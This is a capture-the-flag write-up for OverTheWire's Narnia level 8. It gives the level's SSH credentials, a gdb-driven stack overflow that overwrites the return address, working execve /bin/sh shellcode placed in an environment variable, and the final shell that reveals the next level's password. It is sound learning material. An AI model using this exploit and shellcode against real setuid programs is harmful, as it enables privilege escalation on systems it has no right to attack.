## Login 

` SSH : ssh narnia8@narnia.labs.overthewire.org -p 2226 `
` Pass : i1SQ81fkb8 `

## Solution

First, let’s try to execute the program…

```
$ ssh narnia8@narnia.labs.overthewire.org -p 2226

narnia8@narnia:~$ cd /narnia/
narnia8@narnia:/narnia$ ./narnia8
./narnia8 argument
narnia8@narnia:/narnia$ ./narnia8 test
test
```

The program just print back our input.
### Source Code

Let’s take a look at the source :

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int i;

void func(char *b){
	char *blah=b;
	char bok[20];
	//int i=0;

	memset(bok, '\0', sizeof(bok));
	for(i=0; blah[i] != '\0'; i++)
		bok[i]=blah[i];

	printf("%s\n",bok);
}

int main(int argc, char **argv){

	if(argc > 1)
		func(argv[1]);
	else
	printf("%s argument\n", argv[0]);

	return 0;
}
```

Here we have a potential overflow in the **bok** variable, but if we try to overflow it we got some weird results :

```
narnia8@narnia:/narnia$ ./narnia8 $(python -c 'print 20 * "A"')
AAAAAAAAAAAAAAAAAAAA�������������
narnia8@narnia:/narnia$ ./narnia8 $(python -c 'print 21 * "A"')
Segmentation fault
```

We need to dig deeper, place a breakpoint at _printf()_ in the _func()_ function and run the code…

```
narnia8@narnia:/narnia$ gdb narnia8

(gdb) set disassembly-flavor intel
(gdb) disas func
Dump of assembler code for function func:
   0x0804841b <+0>:	push   ebp
   0x0804841c <+1>:	mov    ebp,esp
   0x0804841e <+3>:	sub    esp,0x18
   0x08048421 <+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048424 <+9>:	mov    DWORD PTR [ebp-0x4],eax
   
...[removed]...

   0x0804847f <+100>:	push   eax
   0x08048480 <+101>:	push   0x8048550
   0x08048485 <+106>:	call   0x80482e0 <printf@plt>
   0x0804848a <+111>:	add    esp,0x8
   0x0804848d <+114>:	nop
   0x0804848e <+115>:	leave
   0x0804848f <+116>:	ret
End of assembler dump.

(gdb) break *func+106
Breakpoint 1 at 0x8048485

(gdb) run $(python -c 'print 20 * "A"')
Starting program: /narnia/narnia8 $(python -c 'print 20 * "A"')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/16wx $esp
0xffffd66c:	0x08048550	0xffffd674	0x41414141	0x41414141
0xffffd67c:	0x41414141	0x41414141	0x41414141	0xffffd871
0xffffd68c:	0xffffd698	0x080484a7	0xffffd871	0x00000000
0xffffd69c:	0xf7e2a286	0x00000002	0xffffd734	0xffffd740

(gdb) run $(python -c 'print 21 * "A"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c 'print 21 * "A"')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/16wx $esp
0xffffd66c:	0x08048550	0xffffd674	0x41414141	0x41414141
0xffffd67c:	0x41414141	0x41414141	0x41414141	0xffffc541
0xffffd68c:	0xffffd698	0x080484a7	0xffffd870	0x00000000
0xffffd69c:	0xf7e2a286	0x00000002	0xffffd734	0xffffd740

(gdb) run $(python -c 'print 22 * "A"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c 'print 22 * "A"')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/16wx $esp
0xffffd65c:	0x08048550	0xffffd664	0x41414141	0x41414141
0xffffd66c:	0x41414141	0x41414141	0x41414141	0xffffd841
0xffffd67c:	0xffffd688	0x080484a7	0xffffd86f	0x00000000
0xffffd68c:	0xf7e2a286	0x00000002	0xffffd724	0xffffd730
```

As you can see, I increased the size of the input for each stack dump. The second one shows that we overwrote 1 byte of the 8th value (from `0xffffd871` to `0xffffc541`), but it seems that we can’t overwrite more bytes…

We also note that the 8th and 11th values are the addresses of our input and the 10th value is the return address:

```
(gdb) run $(python -c 'print 20 * "A"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c 'print 20 * "A"')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/16wx $esp
0xffffd66c:	0x08048550	0xffffd674	0x41414141	0x41414141
0xffffd67c:	0x41414141	0x41414141	0x41414141	0xffffd871
0xffffd68c:	0xffffd698	0x080484a7	0xffffd871	0x00000000
0xffffd69c:	0xf7e2a286	0x00000002	0xffffd734	0xffffd740
(gdb) x/s 0xffffd871
0xffffd871:	'A' <repeats 20 times>
```

Check the following dump, the address `0x080484a7` is in fact the return address to _main()_ at the following line `0x080484a7 <+23>: add esp,0x4`.

```
(gdb) run $(python -c 'print 20 * "A"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c 'print 20 * "A"')

Breakpoint 2, 0x08048485 in func ()
(gdb) x/20xw $esp
0xffffd66c:	0x08048550	0xffffd674	0x41414141	0x41414141
0xffffd67c:	0x41414141	0x41414141	0x41414141	0xffffd871
0xffffd68c:	0xffffd698	0x080484a7	0xffffd871	0x00000000
0xffffd69c:	0xf7e2a286	0x00000002	0xffffd734	0xffffd740
0xffffd6ac:	0x00000000	0x00000000	0x00000000	0xf7fc5000
(gdb) disas main
Dump of assembler code for function main:
   0x08048490 <+0>:	push   ebp
   0x08048491 <+1>:	mov    ebp,esp
   0x08048493 <+3>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x08048497 <+7>:	jle    0x80484ac <main+28>
   0x08048499 <+9>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804849c <+12>:	add    eax,0x4
   0x0804849f <+15>:	mov    eax,DWORD PTR [eax]
   0x080484a1 <+17>:	push   eax
   0x080484a2 <+18>:	call   0x804841b <func>
   0x080484a7 <+23>:	add    esp,0x4
   0x080484aa <+26>:	jmp    0x80484bf <main+47>
   0x080484ac <+28>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080484af <+31>:	mov    eax,DWORD PTR [eax]
   0x080484b1 <+33>:	push   eax
   0x080484b2 <+34>:	push   0x8048554
   0x080484b7 <+39>:	call   0x80482e0 <printf@plt>
   0x080484bc <+44>:	add    esp,0x8
   0x080484bf <+47>:	mov    eax,0x0
   0x080484c4 <+52>:	leave
   0x080484c5 <+53>:	ret
End of assembler dump.
(gdb)
```

Okay, let’s try to restore the original pointer to our string, here it’s `0xffffd871` :

```
(gdb) run $(python -c 'print 20 * "A"')
Starting program: /narnia/narnia8 $(python -c 'print 20 * "A"')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/16x $esp
0xffffd66c:	0x08048550	0xffffd674	0x41414141	0x41414141
0xffffd67c:	0x41414141	0x41414141	0x41414141	0xffffd871
0xffffd68c:	0xffffd698	0x080484a7	0xffffd871	0x00000000
0xffffd69c:	0xf7e2a286	0x00000002	0xffffd734	0xffffd740
```

So, let’s add 1 byte to the payload (`0x71`)

```
(gdb) run $(python -c 'print 20 * "A" + "\x71"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c 'print 20 * "A" + "\x71"')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/16x $esp
0xffffd66c:	0x08048550	0xffffd674	0x41414141	0x41414141
0xffffd67c:	0x41414141	0x41414141	0x41414141	0xffff4c71
0xffffd68c:	0xffffd698	0x080484a7	0xffffd870	0x00000000
0xffffd69c:	0xf7e2a286	0x00000002	0xffffd734	0xffffd740
```

Hum, the orginal address shifted down to `0xffffd870`, let’s fix that :

```
(gdb) run $(python -c 'print 20 * "A" + "\x70"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c 'print 20 * "A" + "\x70"')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/16x $esp
0xffffd66c:	0x08048550	0xffffd674	0x41414141	0x41414141
0xffffd67c:	0x41414141	0x41414141	0x41414141	0xffffd870
0xffffd68c:	0xffffd698	0x080484a7	0xffffd870	0x00000000
0xffffd69c:	0xf7e2a286	0x00000002	0xffffd734	0xffffd740
```

So far, so good. Let’s add a second byte, `0xd8` :

```
(gdb) run $(python -c 'print 20 * "A" + "\x70\xd8"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c 'print 20 * "A" + "\x70\xd8"')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/16x $esp
0xffffd65c:	0x08048550	0xffffd664	0x41414141	0x41414141
0xffffd66c:	0x41414141	0x41414141	0x41414141	0xffffd870
0xffffd67c:	0xffffd688	0x080484a7	0xffffd86f	0x00000000
0xffffd68c:	0xf7e2a286	0x00000002	0xffffd724	0xffffd730
```

Okay, the address shifted down again to `0xffffd86f`. I followed the pattern util I was able to to overwrite the address of our string and continue to write on the stack :

```
(gdb) run $(python -c 'print 20 * "A" + "\x69\xd8\xff\xff" + "AAAA"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c 'print 20 * "A" + "\x69\xd8\xff\xff" + "AAAA"')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/16x $esp
0xffffd65c:	0x08048550	0xffffd664	0x41414141	0x41414141
0xffffd66c:	0x41414141	0x41414141	0x41414141	0xffffd869
0xffffd67c:	0x41414141	0x080484a7	0xffffd869	0x00000000
0xffffd68c:	0xf7e2a286	0x00000002	0xffffd724	0xffffd730
```

The trick to remember is that you have to decrease the address of the string by 1 byte each time you add a byte to the payload. Let’s finish that by overwriting the return address :

```
(gdb) run $(python -c 'print 20 * "A" + "\x65\xd8\xff\xff" + "AAAA" + "CCCC"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c 'print 20 * "A" + "\x65\xd8\xff\xff" + "AAAA" + "CCCC"')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/16x $esp
0xffffd65c:	0x08048550	0xffffd664	0x41414141	0x41414141
0xffffd66c:	0x41414141	0x41414141	0x41414141	0xffffd865
0xffffd67c:	0x41414141	0x43434343	0xffffd865	0x00000000
0xffffd68c:	0xf7e2a286	0x00000002	0xffffd724	0xffffd730
(gdb) continue
Continuing.
AAAAAAAAAAAAAAAAAAAAe���AAAACCCCe���

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
(gdb) x/x $eip
0x43434343:	Cannot access memory at address 0x43434343
```

Perfect ! Now, as the buffer is too small for a shellcode, we will use an environment variable and return to it. I used the following one :

```
export SHELLCODE=$(printf "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80")
```

Now, we’ll try to execute it in GDB. Note, that the addresses might have shifted so make sure to repeat the previous steps to fix the addresses of our payload.

```
(gdb) run $(python -c 'print 20 * "A" + "\x47\xd8\xff\xff" + "AAAA" + "CCCC"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c 'print 20 * "A" + "\x47\xd8\xff\xff" + "AAAA" + "CCCC"')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/16x $esp
0xffffd63c:	0x08048550	0xffffd644	0x41414141	0x41414141
0xffffd64c:	0x41414141	0x41414141	0x41414141	0xffffd847
0xffffd65c:	0x41414141	0x43434343	0xffffd847	0x00000000
0xffffd66c:	0xf7e2a286	0x00000002	0xffffd704	0xffffd710
```

Then, we will retreive our environment variable **SHELLCODE** by repeating the following command `x/s *((char **)environ)`.

```
(gdb) x/s *((char **)environ)
0xffffd861:	"LC_ALL=en_US.UTF-8"

...[removed]...

(gdb) x/s *((char **)environ)
0xffffde75:	"LANG=en_US.UTF-8"
(gdb) x/s *((char **)environ)
0xffffde86:	"OLDPWD=/tmp"
(gdb) x/s *((char **)environ)
0xffffde92:	"SHELLCODE=1\300\061\333\061ə\260\244̀j\vXQh//shh/bin\211\343Q\211\342S\211\341̀"
```

Finally, we complete the payload :

```
(gdb) run $(python -c 'print 20 * "A" + "\x40\xd8\xff\xff" + "AAAA" + "\x92\xde\xff\xff"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 $(python -c 'print 20 * "A" + "\x40\xd8\xff\xff" + "AAAA" + "\x92\xde\xff\xff"')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/16xw $esp
0xffffd63c:	0x08048550	0xffffd644	0x41414141	0x41414141
0xffffd64c:	0x41414141	0x41414141	0x41414141	0xffffd840
0xffffd65c:	0x41414141	0xffffde92	0xffffd840	0x00000000
0xffffd66c:	0xf7e2a286	0x00000002	0xffffd704	0xffffd710
(gdb) conti
Continuing.
AAAAAAAAAAAAAAAAAAAA@���AAAA����@���
process 10478 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "func" in current context.
Error in re-setting breakpoint 1: No symbol "func" in current context.
Error in re-setting breakpoint 1: No symbol "func" in current context.
$ 
```

Awesome, now we need to do the same outside GDB. First, let’s find the **SHELLCODE** environment variable with the following code :

```
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[])
{
  printf("%s is at %p\n", argv[1], getenv(argv[1]));
}
```

You can, compile it in **/tmp/** :

```
narnia8@narnia:/narnia$ cd /tmp
narnia8@narnia:/tmp$ gcc -m32 find_addr.c -o find_addr
narnia8@narnia:/tmp$ ./find_addr SHELLCODE
SHELLCODE is at 0xffffdea1
```

Then, we need to find the pointer of our payload :

```
narnia8@narnia:/narnia$ ./narnia8  $(python -c 'print 20 * "A"')  | xxd
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 6ad8 ffff 98d6 ffff a784 0408  AAAAj...........
00000020: 6ad8 ffff 0a                             j....
narnia8@narnia:/narnia$ python -c 'print "{:8x}".format(0xffffd86a-12)'
ffffd85e
./narnia8 $(python -c 'print 20 * "A" + "\x5e\xd8\xff\xff" + "AAAA" + "\xa1\xde\xff\xff"')
AAAAAAAAAAAAAAAAAAAA^���AAAA����^���
$ whoami
narnia9
$ cat /etc/narnia_pass/narnia9
eiL5fealae
```

Finally ! This one was kind of hard. It took me a while to figure it out :)